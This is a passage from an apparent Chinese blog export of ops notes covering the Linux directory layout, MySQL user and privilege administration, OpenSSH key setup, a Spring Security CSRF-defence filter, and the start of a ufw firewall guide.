<li><p><code>/bin</code> __基础系统__所需要的命令位于此目录，是最小系统所需要的命令，如：ls, cp, mkdir等。<br>   这个目录中的文件都是可执行的，一般的用户都可以使用。</p>
</li>
<li><p><code>/sbin</code> 大多是涉及__系统管理__的命令的存放，是超级权限用户__root__的可执行命令存放地，普通用户无权限执行这个目录下的命令；这个目录和&#x2F;usr&#x2F;sbin; &#x2F;usr&#x2F;X11R6&#x2F;sbin或&#x2F;usr&#x2F;local&#x2F;sbin 目录是相似的； 我们记住就行了，凡是目录sbin中包含的都是root权限才能执行的。</p>
</li>
<li><p><code>/dev</code> 设备文件存储目录，比如声卡、磁盘… … 这是一个非常有趣的目录，是Linux文件系统的一个闪亮的特性 - 所有对象都是文件或目录。仔细观察这个目录你会发现hda1, hda2等, 它们代表系统主硬盘的不同分区。</p>
<p>&#x2F;dev&#x2F;cdrom和&#x2F;dev&#x2F;fd0代表你的CDROM驱动器和floppy驱动器。看上去可能有些奇怪，但比较文件和硬件的特性这却是十分合理的。它们都可以读出和写入。例如&#x2F;dev&#x2F;dsp，这个文件代表你的扬声器。那么写入这个文件的数据都回传送到喇叭。试一试 ‘cat &#x2F;etc&#x2F;lilo.conf &gt; &#x2F;dev&#x2F;dsp’ 你会听到一些声音。这是你的 lilo.conf 文件的声音！同样，向&#x2F;dev&#x2F;ttyS0 ( COM 1 ) 读出或写入数据你可以和接到上面的设备进行通讯。</p>
</li>
<li><p><code>/home</code> 普通用户默认存放目录 Linux 是多用户环境，所以每一个用户都有一个只有自己可以访问的目录（当然管理员也可以访问）。它们以 &#x2F;home&#x2F;username 的方式存在。这个目录也__保存一些应用对于这个用户的配置__，比如 IRC, X 等。</p>
</li>
<li><p><code>/lib</code>或<code>lib32</code>或<code>/lib64</code> 库文件存放目录这里包含了__系统__程序所需要的所有共享库文件，类似于 Windows 的共享库 DLL 文件。</p>
</li>
<li><p><code>/lost+found</code> 在ext2或ext3文件系统中，当系统意外崩溃或机器意外关机，而产生一些文件碎片放在这里。当系统启动的过程中fsck工具会检查这里，并修复已经损坏的文件系统。 有时系统发生问题，有很多的文件被移到这个目录中，可能会用手工的方式来修复，或移到文件到原来的位置上。<br>Linux 应该正确的关机。但有时你的系统也可能崩溃掉或突然断电使系统意外关机。那么启动的时候 fsck 将会进行长时间的文件系统检查。Fsck 会检测并试图恢复所发现的不正确的文件。被恢复的文件会放置在这个目录中。所恢复的文件也许并不完整或并不合理，但毕竟提供了一些恢复数据的机会。</p>
</li>
<li><p><code>/media</code> 即插即用型存储设备的挂载点自动在这个目录下创建，比如USB盘系统自动挂载后，会在这个目录下产生一个目录 ；CDROM&#x2F;DVD自动挂载后，也会在这个目录中创建一个目录，类似cdrom 的目录。这个只有在最新的发行套件上才有. </p>
</li>
<li><p><code>/proc</code> 虚拟文件系统。该目录中的数据并不是保存在硬盘中，而是保存在内存当中。主要用来保存操作系统运行时进程、外部设备、内核（比如cpu、硬盘分区、内存信息等）等信息。如 &#x2F;proc&#x2F;cpuinfo 保存的是CPU信息，&#x2F;proc&#x2F;devices 保存的是设备驱动信息列表。</p>
</li>
<li><p><code>/sys</code> 虚拟文件系统。和 &#x2F;proc 目录相似，里面的数据也是保存在内存中的，它主要用来保存__内核的相关信息__。</p>
</li>
<li><p><code>/run</code> 这个目录和&#x2F;var&#x2F;run是类似的，存储了一些系统启动引导时的运行时信息</p>
<p>​</p>
</li>
</ol>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>linux</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql</title>
    <url>/technology/2017/12/mysql/</url>
    <content><![CDATA[<h1 id="mysql运维"><a href="#mysql运维" class="headerlink" title="mysql运维"></a>mysql运维</h1><h2 id="装卸"><a href="#装卸" class="headerlink" title="装卸"></a>装卸</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install mysql-server-5.7</span><br><span class="line">service mysql start</span><br><span class="line">service mysql stop</span><br><span class="line">sudo apt-get remove mysql-server-5.7</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">数据存放目录 /var/lib/mysql</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置存放目录 /etc/mysql</span></span><br></pre></td></tr></table></figure>

<h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root用户登录</span></span><br><span class="line">mysql -u root -p</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切勿修改root用户和使用root用户进行生产</span></span><br></pre></td></tr></table></figure>

<p><a href="https://dev.mysql.com/doc/refman/5.7/en/adding-users.html">Adding User Accounts</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># e.g.1</span><br><span class="line">CREATE USER &#x27;finley&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;finley&#x27;@&#x27;localhost&#x27; WITH GRANT OPTION;</span><br><span class="line">GRANT ALL PRIVILEGES ON database.table TO &#x27;finley&#x27;@&#x27;localhost&#x27; WITH GRANT OPTION;</span><br><span class="line"># e.g.2</span><br><span class="line">CREATE USER &#x27;finley&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;finley&#x27;@&#x27;%&#x27; WITH GRANT OPTION;</span><br><span class="line"># e.g.3</span><br><span class="line">CREATE USER &#x27;admin&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;;</span><br><span class="line">GRANT RELOAD,PROCESS ON *.* TO &#x27;admin&#x27;@&#x27;localhost&#x27;;</span><br><span class="line"># e.g.4</span><br><span class="line">CREATE USER &#x27;dummy&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<p><a href="https://dev.mysql.com/doc/refman/5.7/en/removing-users.html">Removing User Accounts</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP USER &#x27;jeffrey&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="授权管理"><a href="#授权管理" class="headerlink" title="授权管理"></a>授权管理</h2><p><a href="https://dev.mysql.com/doc/refman/5.7/en/privilege-system.html">The MySQL Access Privilege System</a></p>
<p><a href="https://dev.mysql.com/doc/refman/5.7/en/privilege-changes.html">When Privilege Changes Take Effect</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># e.g.1</span><br><span class="line">GRANT ALL ON db1.* TO &#x27;jeffrey&#x27;@&#x27;localhost&#x27;;</span><br><span class="line"># e.g.2</span><br><span class="line">GRANT SELECT ON db2.invoice TO &#x27;jeffrey&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="授权用户远程连接"><a href="#授权用户远程连接" class="headerlink" title="授权用户远程连接"></a>授权用户远程连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检查一下3个配置文件是否有host绑定</span><br><span class="line">/etc/mysql/mysql.cnf</span><br><span class="line">/etc/mysql/conf.d/mysql.cnf</span><br><span class="line">/etc/mysql/mysql.conf.d/mysql.cnf</span><br><span class="line"># 注释本地host绑定</span><br><span class="line">bind-address = 127.0.0.1</span><br><span class="line"># 授权用户可连接的host</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;user&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password&#x27; WITH GRANT OPTION;</span><br><span class="line"># 刷新授权</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<h2 id="数据编码"><a href="#数据编码" class="headerlink" title="数据编码"></a>数据编码</h2><p><a href="https://dev.mysql.com/doc/refman/5.7/en/charset-configuration.html">Character Set Configuration</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看编码设置</span><br><span class="line">show variables like &#x27;%character%&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="DDL、DML导入脚本"><a href="#DDL、DML导入脚本" class="headerlink" title="DDL、DML导入脚本"></a>DDL、DML导入脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u user -p</span><br><span class="line">use database</span><br><span class="line">source ~/script.sql</span><br></pre></td></tr></table></figure>

<h2 id="数据备份与恢复"><a href="#数据备份与恢复" class="headerlink" title="数据备份与恢复"></a>数据备份与恢复</h2><p><a href="https://dev.mysql.com/doc/refman/5.7/en/backup-and-recovery.html">Chapter 7 Backup and Recovery</a></p>
<p>分为物理备份和逻辑备份两种</p>
<p>物理备份是备份的数据元文件，备份恢复快，适合数据量大，压缩率低，占用空间多，需要快速恢复的场景。具体可参考 <a href="https://dev.mysql.com/doc/refman/5.7/en/mysql-enterprise-backup.html">MySQL Enterprise Backup Overview</a></p>
<p>逻辑备份是备份DDL,DML语句，备份恢复慢，适合数据量小，压缩率高，占用空间少，恢复速度要求低的场景<img src="http://img.willowspace.cn/willowspace_2016/1512758006545.png?imageMogr2/thumbnail/800"></p>
<p>具体选择的策略可参考<a href="http://cenalulu.github.io/mysql/how-we-do-mysql-backup-in-facebook/">MySQL Backup in Facebook</a></p>
<p>逻辑备份具体可选用主从复制的方式，从slave节点上进行备份.</p>
<p>贴个逻辑备份脚本</p>
<h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p><a href="https://dev.mysql.com/doc/refman/5.7/en/replication.html">Replication</a></p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
        <tag>mysql</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh与OpenSSH</title>
    <url>/technology/2017/01/ssh%E4%B8%8EOpenSSH/</url>
    <content><![CDATA[<h1 id="服务端安装并启动Openssh服务"><a href="#服务端安装并启动Openssh服务" class="headerlink" title="服务端安装并启动Openssh服务"></a>服务端安装并启动Openssh服务</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>

<h1 id="服务端授权客户端访问"><a href="#服务端授权客户端访问" class="headerlink" title="服务端授权客户端访问"></a>服务端授权客户端访问</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改授权访问文件，若无此文件则新建</span></span><br><span class="line">vim ~/.ssh/authorized_keys</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按行输入须授权的客户端ssh公钥即可</span></span><br></pre></td></tr></table></figure>

<h1 id="客户端配置公私钥对"><a href="#客户端配置公私钥对" class="headerlink" title="客户端配置公私钥对"></a>客户端配置公私钥对</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ssh-keygen -t rsa -f ~/.ssh/id_rsa_xxx -C &quot;...&quot;</span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>

<h1 id="添加客户端ssh公钥到服务器授权访问列表"><a href="#添加客户端ssh公钥到服务器授权访问列表" class="headerlink" title="添加客户端ssh公钥到服务器授权访问列表"></a>添加客户端ssh公钥到服务器授权访问列表</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ssh-copy-id -i ~/.ssh/id_rsa.pub user@server_ip</span><br></pre></td></tr></table></figure>

<h1 id="使用ssh进行免密登录"><a href="#使用ssh进行免密登录" class="headerlink" title="使用ssh进行免密登录"></a>使用ssh进行免密登录</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ssh user@server_ip</span><br></pre></td></tr></table></figure>

<h1 id="客户端配置n个Key访问n个服务"><a href="#客户端配置n个Key访问n个服务" class="headerlink" title="客户端配置n个Key访问n个服务"></a>客户端配置n个Key访问n个服务</h1><p><a href="https://appkfz.com/2015/06/18/git-ssh-key/">https://appkfz.com/2015/06/18/git-ssh-key/</a></p>
<p>多站点使用不同的ssh key</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Host company</span><br><span class="line">  HostName company.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/user1</span><br><span class="line">Host github</span><br><span class="line">  HostName github.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/user2</span><br></pre></td></tr></table></figure>

<p>同一站点使用不同的ssh key</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Host gitcafe-site1</span><br><span class="line">  HostName gitcafe.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/user1</span><br><span class="line">Host gitcafe-site2</span><br><span class="line">  HostName gitcafe.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/user2</span><br></pre></td></tr></table></figure>

<h1 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h1><h2 id="ssh-add报错"><a href="#ssh-add报错" class="headerlink" title="ssh-add报错"></a>ssh-add报错</h2><h3 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Error connecting to agent: Connection refused</span><br></pre></td></tr></table></figure>

<p>  重启ssh-agent</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exec ssh-agent zsh</span><br><span class="line">eval `ssh-agent -s`</span><br></pre></td></tr></table></figure>

<h3 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h3>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">No user exists for uid 501</span><br></pre></td></tr></table></figure>

<p>  重启终端即可</p>
<h1 id="多客户端SSH-KEY"><a href="#多客户端SSH-KEY" class="headerlink" title="多客户端SSH KEY"></a>多客户端SSH KEY</h1><p>配置了多个KEY，但是jenkins验证失败，尝试重启jenkins所在的web服务器</p>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>ops</tag>
      </tags>
  </entry>
  <entry>
    <title>spring-security与csrf防御</title>
    <url>/technology/2017/01/spring-security%E4%B8%8Ecsrf%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<h1 id="一、保护的过程"><a href="#一、保护的过程" class="headerlink" title="一、保护的过程"></a>一、保护的过程</h1><p>防御csrf的过程大致如下</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1483949254196.png?imageMogr2/thumbnail/600" alt="img"></p>
<h2 id="1-给页面表单-接口添加token"><a href="#1-给页面表单-接口添加token" class="headerlink" title="1. 给页面表单&#x2F;接口添加token"></a>1. 给页面表单&#x2F;接口添加token</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">doAction</span><span class="params">(Map context, CGI cgi)</span> &#123;</span><br><span class="line">  CsrfTokenRepository.setToken(context, cgi);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-在csrfFilter中检测token"><a href="#2-在csrfFilter中检测token" class="headerlink" title="2. 在csrfFilter中检测token"></a>2. 在csrfFilter中检测token</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> (!csrfToken.getToken().equals(actualToken)) &#123;</span><br><span class="line">    response.sendError(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  filterChain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、实现相关类"><a href="#二、实现相关类" class="headerlink" title="二、实现相关类"></a>二、实现相关类</h1><p><img src="http://img.willowspace.cn/willowspace_2016/1484043428967.png?imageMogr2/thumbnail/400" alt="img"></p>
<p>为了防御csrf攻击我们需要一个过滤器来对请求进行合法性检测，检测的标准是验证一个token，这个token由CsrfTokenRespository接口的实现类来生产和管理token</p>
<h2 id="1-实现CsrfFilter"><a href="#1-实现CsrfFilter" class="headerlink" title="1. 实现CsrfFilter"></a>1. 实现CsrfFilter</h2><blockquote>
<p>参考org.springframework.security.web.csrf.CsrfFilter</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CsrfFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line"><span class="comment">//生产token的货</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> CsrfTokenRepository tokenRepository;</span><br><span class="line"><span class="comment">//做放行列表检测的货</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">RequestMatcher</span> <span class="variable">requireCsrfProtectionMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CsrfFilter</span>.DefaultRequiresCsrfMatcher();</span><br><span class="line"><span class="comment">//做检测结果处理逻辑的货</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">AccessDeniedHandler</span> <span class="variable">accessDeniedHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedHandlerImpl</span>();</span><br><span class="line"><span class="comment">//....</span></span><br></pre></td></tr></table></figure>

<h2 id="2-实现CsrfTokenRepository"><a href="#2-实现CsrfTokenRepository" class="headerlink" title="2. 实现CsrfTokenRepository"></a>2. 实现CsrfTokenRepository</h2><blockquote>
<p>改写org.springframework.security.web.csrf.CsrfTokenRepository</p>
</blockquote>
<p>主要需要结合自己生产环境的模板引擎产出token</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpSessionCsrfTokenRepository</span> <span class="keyword">implements</span> <span class="title class_">CsrfTokenRepository</span> &#123;</span><br><span class="line">    <span class="comment">//结合模板引擎生产csrf token</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setToken</span><span class="params">(HttpServletRequest request, ModelMap context)</span> &#123;</span><br><span class="line">      <span class="comment">//尝试拿csrf filter中设置的token</span></span><br><span class="line">      <span class="type">CsrfToken</span> <span class="variable">csrfToken</span> <span class="operator">=</span> (CsrfToken) request.getAttribute(CsrfToken.class.getName());</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != csrfToken) &#123;</span><br><span class="line">        context.put(<span class="string">&quot;_csrf&quot;</span>, csrfToken);</span><br><span class="line">        context.put(<span class="string">&quot;_csrf_header&quot;</span>, <span class="string">&quot;X-CSRF-TOKEN&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、配置"><a href="#三、配置" class="headerlink" title="三、配置"></a>三、配置</h1><p>我们编写的CsrfFilter如果是一个bean，那么实际上我们不能按普通的过滤器那样直接加入到容器中，而应该把它加入到spring-security的filterChain中，并且使用org.springframework.web.filter.DelegatingFilterProxy这个spring为我们提供的代理过滤器来将spring-security的filterChain嫁接到web容器的filterChain当中。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1483943320997.png?imageMogr2/thumbnail/400" alt="img"></p>
<h2 id="1-添加依赖jar包"><a href="#1-添加依赖jar包" class="headerlink" title="1. 添加依赖jar包"></a>1. 添加依赖jar包</h2><p>导入 spring-security-web 及 spring-security-config 两个jar包依赖</p>
<h2 id="2-配置web-xml"><a href="#2-配置web-xml" class="headerlink" title="2. 配置web.xml"></a>2. 配置web.xml</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置DelegatingFilterProxy来代理spring-security的filterChain--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>csrfFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--需要保护的请求路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>csrfFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>&#123;path&#125;<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="3-新增配置spring-security-xml"><a href="#3-新增配置spring-security-xml" class="headerlink" title="3. 新增配置spring-security.xml"></a>3. 新增配置spring-security.xml</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans:beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/security&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns:beans</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">                    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                    http://www.springframework.org/schema/security</span></span></span><br><span class="line"><span class="string"><span class="tag">                    http://www.springframework.org/schema/security/spring-security-3.2.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http</span> <span class="attr">auto-config</span>=<span class="string">&quot;true&quot;</span> <span class="attr">authentication-manager-ref</span>=<span class="string">&quot;fake&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- csrf --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">csrf</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">custom-filter</span> <span class="attr">ref</span>=<span class="string">&quot;csrfFilter&quot;</span> <span class="attr">after</span>=<span class="string">&quot;ANONYMOUS_FILTER&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">http</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!--注入CsrfFilter--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans:bean</span> <span class="attr">id</span>=<span class="string">&quot;csrfFilter&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.willowspace.security.CsrfFilter&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">beans:constructor-arg</span> <span class="attr">ref</span>=<span class="string">&quot;csrfTokenRepository&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans:bean</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!--注入HttpSessionCsrfTokenRepository--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans:bean</span> <span class="attr">id</span>=<span class="string">&quot;csrfTokenRepository&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.security.web.csrf.HttpSessionCsrfTokenRepository&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">authentication-manager</span> <span class="attr">id</span>=<span class="string">&quot;fake&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans:beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="四、抛弃spreing-security过重的filterChain"><a href="#四、抛弃spreing-security过重的filterChain" class="headerlink" title="四、抛弃spreing-security过重的filterChain"></a>四、抛弃spreing-security过重的filterChain</h1><p>spring-security的filterChain中有很多filter，可以做很丰富的事情，一旦你使用了它，那么这些filter将都会被按顺序执行。如果你仅仅需要csrf防御，那么使用spring-security的filterChain对项目来说就太重了。我们可以如下使用自定义的原生filter来达到同样的目的。</p>
<p><img src="http://img.willowspace.cn/willowspace_2016/1483943561090.png?imageMogr2/thumbnail/600" alt="img"></p>
<h2 id="1-使用原生Filter"><a href="#1-使用原生Filter" class="headerlink" title="1. 使用原生Filter"></a>1. 使用原生Filter</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>csrfFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>framework.security.SimpleCsrfFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>csrfFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>&#123;path&#125;<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-由web容器初始化CsrfFilter"><a href="#2-由web容器初始化CsrfFilter" class="headerlink" title="2. 由web容器初始化CsrfFilter"></a>2. 由web容器初始化CsrfFilter</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CsrfFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> CsrfTokenRepository tokenRepository;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">SimpleCsrfFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">CsrfTokenRepository</span> <span class="variable">csrfTokenRepository</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpSessionCsrfTokenRepository</span>();</span><br><span class="line">    Assert.notNull(csrfTokenRepository, <span class="string">&quot;csrfTokenRepository cannot be null&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.tokenRepository = csrfTokenRepository;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol>
<li><a href="https://springcloud.cc/spring-security-zhcn.html#csrf-using">Using Spring Security CSRF Protection</a></li>
<li><a href="https://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html">Cross Site Request Forgery (CSRF)</a></li>
</ol>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>linux防火墙快速实践</title>
    <url>/technology/2017/05/linux%E9%98%B2%E7%81%AB%E5%A2%99%E5%BF%AB%E9%80%9F%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h3 id="linux防火墙介绍"><a href="#linux防火墙介绍" class="headerlink" title="linux防火墙介绍"></a>linux防火墙介绍</h3><p><strong>iptables</strong></p>
<p>Ubuntu的Linux内核提供一个数据包过滤框架：<code>netfilter</code>，传统的操作的命令行工具是<code>iptables</code>。它提供一套完整的可灵活配置的防火墙解决方案。但是它的使用相对复杂</p>
<p>精通<code>iptables</code>需要耗费很多时间，开始使用<code>iptables</code>来管理网络过滤器是个复杂的工作。所以近年来，出现了许多<code>iptables</code>的前端&#x2F;上游软件，它们都是为了达到不同的目的和满足不同目标用户的需求而生的。</p>
<p><strong>ufw</strong></p>
<p>The Uncomplicated Firewall (<code>ufw</code>)是对iptables的封装，非常适合作为基于主机的防火墙。<code>ufw</code>提供了一套管理<code>netfilter</code>的框架以及一套配置防火墙的命令行接口。<code>ufw</code>的目标是提供一套容易使用的接口给不熟悉防火墙概念的人使用，同时帮助知道自己要干嘛的系统管理员简化复杂的<code>iptables</code>命令的使用。</p>
<h3 id="使用ufw"><a href="#使用ufw" class="headerlink" title="使用ufw"></a>使用ufw</h3><h4 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h4><p>一般ubuntu自带ufw，如果需要也可以自行安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br></pre></td></tr></table></figure>

